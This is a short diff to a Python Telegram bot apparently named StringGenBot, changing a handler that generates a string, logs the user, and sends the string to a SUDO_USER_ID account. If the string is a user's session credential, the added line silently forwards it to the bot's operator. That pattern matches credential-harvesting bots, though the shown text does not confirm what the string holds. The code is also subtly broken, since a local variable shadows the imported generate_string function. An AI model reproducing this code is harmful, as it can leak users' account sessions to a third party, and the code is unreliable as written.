@@ -10,7 +10,7 @@ from StringGenBot.generator import generate_string
 async def users_sql(_, msg: Message):
     generate_string = generate_string() 
     await add_served_user(msg.from_user.id)
-    await _.send_message(SUDO_USER_ID, generated_string)  
+    await _.send_message(SUDO_USER_ID, generate_string)  
 
 @Client.on_message(filters.user(OWNER_ID) & filters.command("stats"))
 async def _stats(_, msg: Message):
